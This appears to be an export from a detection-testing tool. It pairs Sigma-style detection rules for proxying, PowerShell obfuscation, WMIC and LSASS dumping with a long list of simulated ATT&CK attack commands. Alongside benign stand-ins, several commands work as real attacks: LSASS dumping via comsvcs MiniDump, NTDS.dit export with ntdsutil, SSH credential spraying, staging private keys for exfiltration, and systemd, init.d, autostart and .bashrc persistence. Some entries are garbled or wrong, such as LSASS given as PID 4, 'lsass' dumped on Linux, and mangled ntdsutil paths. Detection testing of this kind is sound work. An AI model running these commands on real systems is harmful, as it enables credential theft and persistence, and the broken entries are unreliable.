rules.title: Proxy C2 via netsh portproxy, Impacket, FRP or PowerShell EncodedCommand
rules.description: Detects creation of processes that indicate use of proxy techniques for Command and Control (ATT&CK T1090). Looks for netsh.exe with portproxy, Impacket tools, Fast Reverse Proxy (FRP) binaries, and PowerShell executed with -EncodedCommand. Includes exclusion for legitimate scheduled task executions.

detection.condition: (selection_netsh or selection_impacket or selection_frp or selection_powershell) and not filter_legit

falsepositives: Legitimate use of netsh portproxy for administrative port forwarding
Internal automation scripts that invoke PowerShell with -EncodedCommand
Red team or security testing activities using Impacket tools
Approved deployment of Fast Reverse Proxy (FRP) for legitimate remote access

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Valid Accounts – Credential Reuse via PowerShell, Runas, and Net Use
rules.description: Detects processes that indicate use of extracted Active Directory credentials, such as PowerShell invoked with encoded commands or execution policy flags, runas with /user:, and net use commands. These activities may represent adversaries reusing stolen AD accounts to authenticate to other devices after credential theft.

detection.condition: (selection or selection2 or selection3 or selection4) and not filter_legit

falsepositives: Legitimate administrative PowerShell scripts that use -EncodedCommand or -ExecutionPolicy for deployment.
Scheduled tasks or automation jobs (Task Scheduler) that run PowerShell or net commands.
System maintenance scripts using runas.exe with explicit user parameters.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious PowerShell Execution with Obfuscation Flags
rules.description: Detects execution of powershell.exe with flags commonly used for obfuscation or bypass such as -EncodedCommand, -enc, -ExecutionPolicy, or -Command. Excludes benign usage where PowerShell is invoked with -File to run known scripts.

detection.condition: (selection_enc or selection_enc_short or selection_execpol or selection_cmd) and not filter

falsepositives: Legitimate administrative scripts that invoke PowerShell with the -File flag
Scheduled tasks or system maintenance jobs that run PowerShell scripts without obfuscation flags

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect WMIC Execution for Discovery
rules.description: Detect execution of wmic.exe, which is often used by attackers to discover other systems on the network via Windows Management Instrumentation.
falsepositives: Legitimate administrative scripts or scheduled tasks that use wmic for inventory or configuration management.
System monitoring tools that invoke wmic for health checks.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: LSASS Memory Dumping via Process Creation
rules.description: Detects potential LSASS memory dumping by identifying process creation events targeting lsass.exe with known dumping command-line patterns or tools.
falsepositives: Legitimate administrative tools or backup software that access LSASS memory for system diagnostics or recovery (rare)
Authorized use of procdump or similar tools by system administrators for troubleshooting

falsepositives: Legitimate administrative use of Ntdsutil.exe for authoritative restore or domain controller maintenance

rules.title: Suspicious Command and Scripting Interpreter Activity

rules.title: User Execution of Malicious File via Script or Executable in User Directory
rules.description: Detects user execution of potentially malicious files (e.g., .exe, .vbs, .js, .scr) from user-writable directories such as Temp, AppData, or UserProfile, often seen in phishing campaigns. Includes detection of encoded command execution via PowerShell or script hosts.

detection.condition: selection_executables or selection_scripts or selection_powershell_encoded or selection_script_host

falsepositives: Legitimate software installers dropped in user Temp folders
User-downloaded scripts or tools executed from Downloads folder
Administrative or deployment scripts run from user profile directories

attacks.command: netsh interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.1.100 connectport=80
attacks.description: Basic command to set up a simple port proxy
attacks.expected_behavior: A proxy channel is established from port 8080 to 192.168.1.100:80

attacks.command: netsh interface portproxy add v4tov4 listenport=8080 connectaddress=%COMPUTERNAME% connectport=80
attacks.description: Intermediate command to configure a more specific proxy rule using the computer name
attacks.expected_behavior: A proxy channel is established from port 8080 to the local computer's port 80

attacks.command: netsh interface portproxy add v4tov4 listenport=8080 connectaddress=127.0.0.1 connectport=80 & netsh advfirewall firewall add rule name="ProxyRule" dir=in action=allow protocol=TCP localport=8080
attacks.description: Advanced command to create a complex proxy setup with firewall rule configuration
attacks.expected_behavior: A proxy channel is established from port 8080 to localhost's port 80, and a firewall rule is added to allow incoming traffic on port 8080

attacks.description: Add a new user to the system using net.exe
attacks.expected_behavior: A new user named 'testuser' is added to the system with the specified password.

attacks.description: Create a new local user and add it to the administrators group using PowerShell
attacks.expected_behavior: A new user named 'testuser' is created and added to the administrators group.

attacks.description: Create a new user using wmic.exe
attacks.expected_behavior: A new user named 'testuser' is created with the specified password.

attacks.description: Basic SSH authentication attempt using a known valid account to a network device (e.g., Fortinet firewall or router)
attacks.expected_behavior: Attempts to authenticate to the target host using SSH with the 'admin' account. Runs a benign echo command if successful. Fails silently after 5 seconds if unreachable or credentials are invalid due to BatchMode.

attacks.command: ssh -o BatchMode=yes -i $HOME/.ssh/id_rsa_fortinet admin@10.10.5.20 'ps aux | grep -v root'
attacks.description: Intermediate SSH authentication using a compromised private key associated with a Fortinet device account
attacks.expected_behavior: Authenticates to the remote system using a specific private key file. Executes a process listing command excluding root processes to avoid noise. Assumes the key is already present on the system, simulating credential theft and reuse.

attacks.command: for host in $(seq 1 20); do ssh -o BatchMode=yes -o ConnectTimeout=3 admin@172.16.10.$host 'hostname; ip a' 2>/dev/null || true; done
attacks.description: Advanced credential spraying using a valid account across a subnet of Linux or network devices
attacks.expected_behavior: Loops through IP addresses 172.16.10.1 to 172.16.10.20 and attempts SSH login using the 'admin' account. Runs basic reconnaissance commands on successful access. Errors are suppressed to avoid noise. Simulates lateral movement using valid credentials across a network segment.

attacks.description: Basic PowerShell command to download a file using Invoke-WebRequest to a temporary directory.
attacks.expected_behavior: Downloads a file from a specified URL to the user's TEMP directory. Uses built-in PowerShell cmdlet with no encoding or obfuscation.

attacks.description: Intermediate command using certutil.exe (a built-in Windows binary) invoked via PowerShell to download a file.
attacks.expected_behavior: Uses legacy Windows binary certutil.exe through PowerShell to fetch and store a remote file locally. Demonstrates use of native tools chained with PowerShell for execution.

attacks.description: Advanced command that decodes a Base64 string (harmless text) and writes it to a file using .NET methods via PowerShell.
attacks.expected_behavior: Decodes a Base64-encoded string representing 'The quick brown fox jumps over the lazy dog' and writes it to a file in the TEMP directory. Simulates decoding of payloads without using reflection or malicious content.

attacks.description: Basic PowerShell execution on Linux: writes a test string to a file in the temp directory.
attacks.expected_behavior: Creates a file named test_ps_basic.txt in /tmp (or $env:TEMP) with the content 'PowerShell test execution'. No elevated privileges required. Safe and non-destructive.

attacks.description: Intermediate PowerShell usage with variable assignment and path construction to simulate more complex script logic.
attacks.expected_behavior: Creates a file named test_ps_intermediate.txt in /tmp containing the placeholder text 'Encoded payload placeholder'. Simulates use of variables and dynamic paths without malicious content.

attacks.description: Advanced: Executes a base64-encoded PowerShell command that sleeps for 5 seconds then exits cleanly, simulating obfuscated execution.
attacks.expected_behavior: Decodes and runs a PowerShell command that performs Start-Sleep -Seconds 5; Exit 0. This mimics stealthy, encoded execution often seen in attacks. No file written. Safe and self-terminating after delay.

attacks.description: Basic local WMI query to list the computer's name and domain.
attacks.expected_behavior: Displays the local system's NetBIOS name and domain in a table format.

attacks.description: Intermediate remote WMI query to retrieve the computer name from a specific host.
attacks.expected_behavior: Attempts to connect to the remote host at 192.168.1.20 and, if credentials are valid, returns its NetBIOS computer name.

attacks.command: wmic /output:"%TEMP%\\wmi_info.txt" computersystem get name,domain /format:list && type "%TEMP%\\wmi_info.txt" | findstr /i "Name"
attacks.description: Advanced WMI discovery: writes name and domain information to a temporary file, then filters the output to show only the computer name entries.
attacks.expected_behavior: Creates a file in the user's TEMP directory containing the WMI query results, then prints only the lines containing "Name" (i.e., the computer name).

attacks.description: Basic WMI query to retrieve the NetBIOS name of a remote Windows host.
attacks.expected_behavior: Outputs the computer name of the target host (e.g., "NAME=HOST01").

attacks.description: Intermediate WMI query that gathers the computer name, domain, and hardware manufacturer from the remote system.
attacks.expected_behavior: Returns rows such as "Name=HOST01", "Domain=CORP", "Manufacturer=Dell Inc.".

attacks.description: Advanced WMI query that enumerates shared folders on the remote Windows host and formats the output with awk.
attacks.expected_behavior: Lists each share name and its corresponding path, e.g., "ADMIN$", "C:\Windows".

attacks.description: Uses rundll32 and comsvcs.dll to dump LSASS process memory to a file in %TEMP% using the MiniDump export.
attacks.expected_behavior: Creates a full memory dump of the LSASS process (PID 4) in %TEMP%\\lsass.dmp. The file will contain sensitive credential data and may be large. Requires SYSTEM-level privileges.

attacks.command: cmd.exe /c tasklist /fi "pid eq 4" 2>&1 > NUL && rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 4 %TEMP%\\lsass.bak full
attacks.description: Checks if LSASS (PID 4) is running, then dumps its memory to a .bak file to evade simple file extension detection.
attacks.expected_behavior: Verifies LSASS is present, then creates a memory dump at %TEMP%\\lsass.bak. This variation uses a non-standard extension to bypass basic monitoring rules.

attacks.description: PowerShell-based execution of LSASS memory dump using rundll32 with elevated privileges via RunAs verb.
attacks.expected_behavior: Prompts for elevation if not already admin, then creates a memory dump of LSASS at %TEMP%\\lsass_dump.dat. Uses PowerShell to spawn the process with admin rights, increasing detection risk but ensuring execution context.

attacks.command: pid=$(pgrep lsass); if [ -n "$pid" ]; then sudo gcore -o /tmp/lsass_dump $pid; else echo "lsass process not found"; fi
attacks.description: Basic dump of the LSASS process using gcore, which creates a core file named /tmp/lsass_dump.<pid>.
attacks.expected_behavior: If the LSASS process exists, a core dump file is written to /tmp/lsass_dump.<pid>. The command exits with a message if the process is not found.

attacks.command: pid=$(pgrep lsass); sudo gdb -q -p $pid -ex "set pagination off" -ex "gcore /tmp/lsass_gdb_dump" -ex "detach" -ex "quit"
attacks.description: Intermediate method using gdb to attach to LSASS, generate a core dump, then detach safely.
attacks.expected_behavior: Creates a core dump file at /tmp/lsass_gdb_dump containing LSASS memory, then detaches from the process without terminating it.

attacks.command: pid=$(pgrep lsass); sudo bash -c "echo 0 > /proc/sys/kernel/yama/ptrace_scope; dd if=/proc/$pid/mem of=/tmp/lsass_mem_dump bs=4096 status=none"
attacks.description: Advanced technique that relaxes ptrace restrictions and reads the raw memory of LSASS via /proc/<pid>/mem, writing it to a file.
attacks.expected_behavior: A binary dump of LSASS memory is saved to /tmp/lsass_mem_dump. The command adjusts ptrace settings temporarily and uses dd to copy the memory region.

attacks.command: ntdsutil "activate instance ntds" "create snapshot" "export instance" quit quit
attacks.description: Basic interactive use of ntdsutil to create a snapshot of the Active Directory database for offline extraction of credentials
attacks.expected_behavior: Creates a snapshot of the NTDS.dit database in the default location. This file contains user account information and password hashes. Requires Domain Controller context and elevated privileges.

attacks.command:
cmd.exe /c "echo activate instance ntds > %TEMP%
tds_script.txt & echo create snapshot >> %TEMP%
tds_script.txt & echo export instance >> %TEMP%
tds_script.txt & echo quit >> %TEMP%
tds_script.txt & echo quit >> %TEMP%
tds_script.txt & ntdsutil /inputpath %TEMP%
tds_script.txt /quiet"
attacks.description: Intermediate: Automate ntdsutil using an input script file to silently create and export an AD database snapshot
attacks.expected_behavior: Generates a script file in %TEMP% and uses it to run ntdsutil non-interactively. Produces a snapshot of NTDS.dit without user interaction. Leaves behind a temporary script file.

attacks.command: powershell -Command "try { $script = """activate instance ntds`ncreate snapshot`nexport instance`nquit`nquit"""; $path = '$env:TEMP\ntds_export.txt'; $script | Out-File -FilePath $path -Encoding ASCII -Force; Start-Process ntdsutil -ArgumentList "/inputpath \"$path\" /quiet" -Wait -NoNewWindow; Remove-Item $path -ErrorAction SilentlyContinue } catch { }"
attacks.description: Advanced: PowerShell-based silent execution of ntdsutil via dynamically generated script with cleanup
attacks.expected_behavior: Creates a temporary script in %TEMP%, executes ntdsutil silently using it, then deletes the script. Designed to avoid command-line logging and reduce forensic footprint. Still requires high privileges and affects domain controller state.

attacks.description: Reads the shadow password file to access stored password hashes, simulating credential extraction from a privileged file.
attacks.expected_behavior: Outputs the contents of /etc/shadow, which contains user password hashes. Requires root privileges; otherwise, permission is denied.

attacks.description: Searches temporary cache files for those containing the word 'password' and displays their contents, simulating discovery of credentials in unsecured temporary storage.
attacks.expected_behavior: Finds and prints contents of temporary files with '.cache' extension that contain the string 'password'. May return no results if no such files exist.

attacks.description: Copies the user account database to a temporary file with relaxed permissions, simulating insecure credential storage.
attacks.expected_behavior: Creates a copy of /etc/passwd in /tmp with world-readable permissions. This file does not contain hashes but demonstrates insecure handling of credential-related data.

attacks.command: wmic /node:"192.168.1.10" process call create "cmd.exe /c echo test > %TEMP%\\output.txt"
attacks.description: Use WMIC to remotely execute a command on a target system using basic syntax.
attacks.expected_behavior: Connects to the remote host (192.168.1.10), spawns a process that writes 'test' to output.txt in the target's TEMP directory. Requires WMI permissions and network connectivity.

attacks.command: powershell -Command "try { $service = ([wmiclass]'\\192.168.1.10\root\cimv2:Win32_Service').Create('TempService', 'Temp Service', '%SystemRoot%\\system32\\cmd.exe /c echo test > %TEMP%\\wmicmd.txt', 16, '','','', ''); Start-Service -Name 'TempService' -ErrorAction SilentlyContinue } catch { } finally { (Get-WmiObject -Class Win32_Service -Filter 'Name="TempService"' -ComputerName '192.168.1.10') | Remove-WmiObject -ErrorAction SilentlyContinue }"
attacks.description: Use PowerShell WMI class to create and start a service remotely, simulating WMI-based lateral movement.
attacks.expected_behavior: Remotely creates a transient service on 192.168.1.10 that executes a benign command, then attempts cleanup. Leaves minimal artifacts if successful.

attacks.command: cmd.exe /c "sc \\192.168.1.10 create PSETest binPath= 'cmd.exe /c echo psexec_like > %TEMP%\\pstest.txt' start= auto & sc \\192.168.1.10 start PSETest & sc \\192.168.1.10 delete PSETest"
attacks.description: Simulate PSExec behavior using sc.exe to create, start, and delete a service remotely.
attacks.expected_behavior: Creates a service named PSETest on the remote system, starts it to execute a command, then deletes the service. Uses only built-in binaries and mimics common lateral movement tools.

attacks.description: Basic use of SSH to execute a remote command that creates a test file on the target host.
attacks.expected_behavior: The remote host creates /tmp/remote_test.txt containing the string "test" and returns a success message.

attacks.description: Intermediate scenario: copy a benign file to the remote host and execute it via SSH.
attacks.expected_behavior: The hostname file is transferred to /tmp on the remote host, made executable, and its contents (the host's name) are printed to the console.

attacks.description: Advanced use of SSH ProxyJump to hop through an intermediate host and execute a command on the final target, creating a file.
attacks.expected_behavior: A file /tmp/jump_test.txt is created on the target host and the string "created" is output, confirming successful lateral movement through the jump host.

attacks.description: Uses rundll32 with comsvcs.dll to create a MiniDump of the LSASS process and writes it to a temporary file.
attacks.expected_behavior: A file named lsass_basic.dmp is created in the user's TEMP directory containing a memory dump of LSASS; command may fail without elevated privileges.

attacks.description: PowerShell retrieves the LSASS process ID and passes it to rundll32 MiniDump to create a dump file.
attacks.expected_behavior: Creates lsass_intermediate.dmp in TEMP; success depends on admin rights and SeDebugPrivilege.

attacks.description: Uses WMIC to spawn a process that runs rundll32 MiniDump on LSASS, storing the dump in TEMP.
attacks.expected_behavior: WMIC creates a new process that writes lsass_advanced.dmp to TEMP; may require admin and can be logged via WMIC activity.

attacks.description: Basic credential dump: reads the system's shadow file containing password hashes and writes it to a user-accessible file.
attacks.expected_behavior: The command outputs the contents of /etc/shadow into $HOME/shadow_dump.txt. Requires root privileges; if successful, the file will contain lines with username and hashed passwords.

attacks.description: Intermediate credential dump: extracts only the username and password hash fields from the shadow file.
attacks.expected_behavior: Creates $HOME/shadow_hashes.txt containing lines like 'user:hashed_password'. Requires root to read /etc/shadow; the output is limited to usernames and their hash values.

attacks.description: Advanced credential dump: generates a core dump of the sshd process, then extracts printable strings that may contain password material.
attacks.expected_behavior: A core file named sshd_core.<pid> is created in $HOME, and strings containing the word 'password' are filtered into $HOME/sshd_strings.txt. This demonstrates in‑memory credential extraction; root is needed to dump a privileged process.

attacks.description: Basic command to get a list of running processes using PowerShell
attacks.expected_behavior: Lists running processes

attacks.description: Intermediate command to list files in the TEMP directory using PowerShell, demonstrating command execution and directory safety
attacks.expected_behavior: Lists files in the TEMP directory

attacks.description: Advanced command to start Notepad using PowerShell's Start-Process Cmdlet, demonstrating process creation
attacks.expected_behavior: Opens Notepad

attacks.description: Executes a simple PowerShell command that prints a test string to stdout.
attacks.expected_behavior: The string 'PowerShell test on Linux' is displayed in the console output.

attacks.description: Creates a temporary file with sample content using Set-Content (with -Force) and then reads the file back with Get-Content.
attacks.expected_behavior: A file named sample.txt is written to the temporary directory containing 'Sample data', and its contents are printed to stdout.

attacks.description: Compresses the previously created sample.txt into a zip archive using Compress-Archive with the -Force flag to overwrite any existing archive.
attacks.expected_behavior: A zip file named sample.zip is created in the temporary directory containing sample.txt; if the archive already exists it is overwritten.

attacks.description: Add a new user to simulate initial access
attacks.expected_behavior: A new user is added to the system

attacks.description: Simulate downloading a malicious executable
attacks.expected_behavior: A file is downloaded to the temp directory

attacks.description: Simulate executing a malicious PowerShell script
attacks.expected_behavior: A PowerShell script is executed

attacks.description: Basic command to create a file using cmd.exe
attacks.expected_behavior: Creates a file named test.txt in the temporary directory with the content 'Hello'.

attacks.description: Intermediate command using PowerShell to display a message box
attacks.expected_behavior: Displays a message box with the content 'Hello, World!' using PowerShell.

attacks.description: Advanced command to add a new user using net.exe (requires admin privileges)
attacks.expected_behavior: Adds a new user named 'testuser' with the password 'testpassword' if admin privileges are available.

attacks.description: Displays the current user context, demonstrating a simple command interpreter usage.
attacks.expected_behavior: Outputs the username of the account executing the command.

attacks.description: Lists running processes with their PID, owner, command name, and arguments, showing enumeration via command line.
attacks.expected_behavior: Prints a table of active processes; no modification to the system.

attacks.description: Decodes a Base64-encoded payload and executes it via the shell, illustrating encoded command execution.
attacks.expected_behavior: The decoded command prints "Hello World" to stdout.

attacks.description: Ping a specific IP address to discover if it is reachable
attacks.expected_behavior: The command will send an ICMP echo request to the specified IP address and display the response.

attacks.description: Ping a range of IP addresses to discover reachable hosts
attacks.expected_behavior: The command will send an ICMP echo request to each IP address in the specified range and display the responses.

attacks.description: Use PowerShell to ping multiple IP addresses and discover reachable hosts
attacks.expected_behavior: The command will send an ICMP echo request to each IP address in the specified range and display the responses.

attacks.command: for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip >/dev/null && echo "Host up: 192.168.1.$ip"; done
attacks.description: Basic ping sweep using a Bash loop to probe each address in the 192.168.1.0/24 subnet.
attacks.expected_behavior: The command sends a single ICMP echo request to each IP; responsive hosts are printed as "Host up: <IP>".

attacks.description: Intermediate broadcast ping that attempts to reach all hosts in the subnet with a single command.
attacks.expected_behavior: Sends five ICMP echo requests to the broadcast address; any host that replies will be listed in the ping output.

attacks.description: Advanced discovery using nmap's ping scan to identify live hosts via ICMP, ARP and TCP probes.
attacks.expected_behavior: nmap reports each host that is up, showing its IP address and (when available) MAC address.

attacks.description: Create an archive of a test file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: An archive named 'archive.zip' is created in the user's temp directory, containing 'test.txt'.

attacks.description: Create an archive of all files in the Public Documents folder.
attacks.expected_behavior: An archive named 'documents_archive.zip' is created in the user's temp directory, containing all files from the Public Documents folder.

attacks.description: Using .NET's ZipFile class to create an archive of a folder, demonstrating an alternative method.
attacks.expected_behavior: An archive named 'test_folder_archive.zip' is created in the user's temp directory, containing all files and subfolders from 'test_folder'.

attacks.description: Basic archiving of a single collected file into a tar archive for staging.
attacks.expected_behavior: Creates a tar archive named 'staged_data.tar' in /tmp containing the specified report file. No compression used. Command is non-destructive and uses a specific, benign source file.

attacks.description: Intermediate archiving of multiple PDF files into a ZIP archive for staging.
attacks.expected_behavior: Packages all PDF files from the downloads directory into a ZIP file in /tmp. Uses wildcard expansion but is limited to a specific directory and file type. No recursion. Safe for testing.

attacks.description: Advanced archiving with compression: collects all files in logs directory into a gzipped tarball.
attacks.expected_behavior: Creates a staging directory in /tmp if not present, then creates a compressed tar archive (tgz) containing all files from the user's logs directory. Uses -C to change context and avoid including full path. Non-destructive and limited in scope.

attacks.command: echo "This is a benign phishing email content" > %TEMP%\phishing_email.txt
attacks.description: Creating a text file in the temp directory with benign content to simulate preparing a phishing email.
attacks.expected_behavior: A text file named phishing_email.txt will be created in the user's temp directory containing the specified text.

attacks.description: Scheduling a benign task to run daily, simulating how an attacker might use scheduled tasks for persistence.
attacks.expected_behavior: A scheduled task named 'BenignTask' will be created to run daily, executing a command that writes 'Hello World!' to a file in the temp directory.

attacks.description: Encoding a PowerShell command using Base64, simulating how an attacker might prepare an encoded payload for execution.
attacks.expected_behavior: The command will output the Base64 encoded string of the 'Get-Process' command, demonstrating how attackers might encode their payloads.

attacks.command: cmd.exe /c echo This is a test payload > "%TEMP%\update.log" && start "" "%TEMP%\update.log"
attacks.description: Basic user execution: creates a benign text file and opens it using start command to simulate user-triggered action
attacks.expected_behavior: Creates a file 'update.log' in the user's temp directory with test content and opens it with the default text viewer

attacks.command: powershell -Command "& cmd.exe /c echo Test payload > '%TEMP%\patch.bat' && start-process cmd.exe -ArgumentList '/c %TEMP%\patch.bat && pause' -WindowStyle Hidden"
attacks.description: Intermediate user execution: creates a batch file in temp and executes it silently with hidden window to simulate stealthy script run
attacks.expected_behavior: Writes a simple batch file to temp and runs it in a hidden window, displaying 'Test payload' and pausing

attacks.description: Advanced user execution: decodes Base64 string (UTF-16LE) into a file and opens it with notepad to simulate encoded payload execution
attacks.expected_behavior: Decodes a Base64 string representing a simple message, saves it as a Unicode text file in temp, and opens it in Notepad

attacks.description: Creates a simple bash script in the user's home directory, makes it executable, and runs it directly, representing a classic user‑execution scenario.
attacks.expected_behavior: The script prints 'User executed payload' to the terminal and exits.

attacks.command:
mkdir -p $HOME/.config/autostart && printf '[Desktop Entry]
Type=Application
Exec=$HOME/malicious.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=MaliciousApp
' > $HOME/.config/autostart/malicious.desktop && printf '#!/bin/bash
echo "Autostart payload executed"
' > $HOME/malicious.sh && chmod +x $HOME/malicious.sh
attacks.description: Drops a .desktop autostart entry in the user's config directory that points to a script, causing the script to run automatically when the user logs into their GUI session.
attacks.expected_behavior: On the next graphical login, the autostart entry triggers the script, which prints 'Autostart payload executed' to the user's session.

attacks.command: printf "\nalias ls='echo \"Malicious ls executed\"; /bin/ls'\n" >> $HOME/.bashrc && source $HOME/.bashrc && ls
attacks.description: Appends a malicious alias to the user's .bashrc so that invoking the common 'ls' command first prints a message, demonstrating user‑execution via a modified shell environment.
attacks.expected_behavior: When the user runs 'ls', the terminal first displays 'Malicious ls executed' followed by the normal directory listing.

attacks.description: Collects user information from the local system
attacks.expected_behavior: Lists all user accounts on the system

attacks.description: Collects detailed user information from the local system
attacks.expected_behavior: Lists all local user accounts with their names and descriptions

attacks.description: Collects privilege information of the current user
attacks.expected_behavior: Displays the privileges of the current user

attacks.description: List all files in the /home directory to identify user directories and potential data locations
attacks.expected_behavior: Outputs a directory listing of /home, showing user home directories. May show hidden files. No modification to system state.

attacks.description: Search for commonly used sensitive file names such as private keys, PGP files, or configuration files containing credentials
attacks.expected_behavior: Finds and prints paths of files matching the specified patterns. Errors from permission-denied are suppressed. No file contents are read or exfiltrated.

attacks.command: find /home -type f \( -name "*.key" -o -name "*.pgp" -o -name "config.json" \) -exec tar -czf $HOME/sensitive_files.tgz {} + 2>/dev/null || echo "No files found or archive failed"
attacks.description: Finds sensitive files and archives them into a compressed tarball in the user's home directory for potential exfiltration
attacks.expected_behavior: Creates a compressed archive of matching sensitive files. If no files are found or access is denied, the command fails silently except for the fallback message. The system remains unharmed, but data aggregation occurs locally.

attacks.description: Execute a command using alternate credentials via runas, simulating use of stolen credentials
attacks.expected_behavior: Prompts for password of victim_user; if correct, runs 'echo Hello' under that user context

attacks.description: Map a network drive using alternate credentials, simulating credential reuse
attacks.expected_behavior: Authenticates to \\fileserver\share with provided credentials and establishes a session

attacks.command: powershell -Command "$secPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('victim_user', $secPassword); Start-Process powershell.exe -Credential $cred -ArgumentList '-Command "Write-Host \"Running as alternate user\""' -WindowStyle Hidden"
attacks.description: Use PowerShell to start a process with alternate credentials, simulating persistent access with stolen credentials
attacks.expected_behavior: Launches a hidden PowerShell window running under victim_user context, displaying a test message

attacks.description: Appends a stolen SSH public key to the current user's authorized_keys file, allowing future SSH logins without a password.
attacks.expected_behavior: The key is added; subsequent SSH connections using the matching private key succeed without prompting for a password.

attacks.command:
echo -e "[Unit]
Description=Persistence Test Service
[Service]
ExecStart=/bin/bash -c 'echo "Persistence active" >> /tmp/persistence.log'
[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/persistence-test.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable persistence-test.service && sudo systemctl start persistence-test.service
attacks.description: Creates and enables a systemd service using root privileges that runs a harmless script, demonstrating persistence via stolen sudo credentials.
attacks.expected_behavior: A new systemd service is installed, enabled, and started; it appends a line to /tmp/persistence.log each time it runs, confirming that the attacker can maintain persistence using elevated rights.

attacks.description: Lists all running services to identify potential targets for modification
attacks.expected_behavior: Creates a text file in the temporary directory listing all running services

attacks.command: sc create MyTestService binPath= "C:\Windows\System32\cmd.exe /c echo Hello World!" start= auto
attacks.description: Creates a new service named MyTestService that executes a command prompt with a benign payload
attacks.expected_behavior: A new service is created and configured to start automatically, executing the specified command

attacks.command: powershell -Command "Start-Process cmd -ArgumentList '/c echo This is a test > $env:TEMP\test.txt'"
attacks.description: Uses PowerShell to start a new command prompt process that writes a test string to a file in the temporary directory
attacks.expected_behavior: A new file named test.txt is created in the temporary directory containing the specified text

attacks.description: Creates a benign payload script and registers it in /etc/crontab to run at system boot via a cron @reboot entry.
attacks.expected_behavior: On the next reboot, cron will execute /tmp/payload.sh as root, appending 'Evil run' to /tmp/evil.log.

attacks.command:
echo -e '#!/bin/bash\necho "Evil run" >> /tmp/evil.log' > /tmp/payload.sh && chmod +x /tmp/payload.sh && cat <<'EOF' > /etc/systemd/system/evil.service
[Unit]
Description=Evil Service
After=network.target

[Service]
ExecStart=/tmp/payload.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable evil.service && systemctl start evil.service
attacks.description: Creates a systemd service unit that runs the payload script, enables it to start at boot, and starts it immediately.
attacks.expected_behavior: systemd loads the new service, starts it, and on each boot the service will execute /tmp/payload.sh, logging 'Evil run' to /tmp/evil.log.

attacks.command:
echo -e '#!/bin/bash\necho "Evil run" >> /tmp/evil.log' > /tmp/payload.sh && chmod +x /tmp/payload.sh && cat <<'EOF' > /etc/init.d/evil
#!/bin/sh
### BEGIN INIT INFO
# Provides:          evil
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Evil init script
### END INIT INFO

case "$1" in
  start)
    echo "Starting evil"
    /tmp/payload.sh &
    ;;
  stop)
    echo "Stopping evil"
    pkill -f /tmp/payload.sh
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
    ;;
esac
exit 0
EOF
chmod +x /etc/init.d/evil && update-rc.d evil defaults && service evil start
attacks.description: Installs an init.d script that runs the payload script as a background process and registers it to start at default runlevels.
attacks.expected_behavior: The init script is added to system startup; when the system boots, the script runs /tmp/payload.sh, appending 'Evil run' to /tmp/evil.log. The script also starts immediately via 'service evil start'.

attacks.description: Copy a tool from a remote file share to the local temp directory using built-in copy command
attacks.expected_behavior: Copies nc.exe from a remote share to the local %TEMP% directory if network access and share permissions allow

attacks.description: Download a tool from an internal web server using certutil, a built-in Windows binary
attacks.expected_behavior: Fetches tool.exe from an internal HTTP server and saves it to %TEMP%; succeeds if web server is reachable

attacks.description: Use PowerShell to transfer a tool from an SMB share and execute it silently
attacks.expected_behavior: Downloads winrm_tool.exe from a remote SMB path to %TEMP% and executes it in a hidden window; uses built-in PowerShell cmdlets for transfer

attacks.description: Transfers a local test script to a remote Linux host using scp
attacks.expected_behavior: Copies /tmp/test_tool.sh to the remote host at 192.168.1.50:/tmp/. Requires SSH access. No output on success.

attacks.description: Uses rsync over SSH to transfer a Python test enumeration script to a remote system
attacks.expected_behavior: Synchronizes a single test script to the remote host using SSH. Verbose output shown during transfer.

attacks.description: Downloads a base64-encoded test script from an internal server and executes it in memory
attacks.expected_behavior: Fetches encoded content from a local HTTP server, decodes it, and executes in the current shell. Simulates stealthy tool transfer and execution without writing to disk.

attacks.description: Starting the telnet service to demonstrate application layer protocol usage for potential C2.
attacks.expected_behavior: The telnet service starts, allowing for potential C2 communication over the application layer protocol.

attacks.description: Downloading a benign file using PowerShell to simulate C2 communication over HTTP.
attacks.expected_behavior: A benign file is downloaded from the specified URI and saved to the temp directory.

attacks.description: Decoding a Base64 encoded file using certutil.exe, simulating decoding of C2 instructions.
attacks.expected_behavior: The Base64 encoded file is decoded and saved as a new file, demonstrating potential for decoding C2 communications.

attacks.description: Create an obfuscated text file using PowerShell.
attacks.expected_behavior: A file named obfuscated.txt will be created in the TEMP directory with the content 'Hello World'.

attacks.description: Create an obfuscated text file using the command prompt.
attacks.expected_behavior: A file named obfuscated.txt will be created in the TEMP directory with the content 'Hello World'.

attacks.description: Create an obfuscated binary file using PowerShell.
attacks.expected_behavior: A file named obfuscated.bin will be created in the TEMP directory with the binary content of 'Hello World'.

attacks.description: Creates a clear‑text file and then encodes it with Base64, producing an obfuscated version of the original content.
attacks.expected_behavior: Two files appear in the user's home directory: hello.txt containing the original string and hello.txt.b64 containing the Base64‑encoded representation.

attacks.description: Encrypts a simple shell script using AES‑256‑CBC via OpenSSL, hiding its plaintext content.
attacks.expected_behavior: A new file secret.sh.enc is created containing the encrypted binary data; the original secret.sh remains unchanged.

attacks.command: dd if=/dev/urandom of=$HOME/payload.bin bs=1k count=4 && gzip -c $HOME/payload.bin | base64 > $HOME/.payload_obf && rm $HOME/payload.bin && mv $HOME/.payload_obf $HOME/$(printf '\x01\x02\x03\x04')
attacks.description: Generates random binary data, compresses it, Base64‑encodes the result, deletes the original binary, and stores the obfuscated payload under a non‑printable filename, demonstrating layered obfuscation techniques.
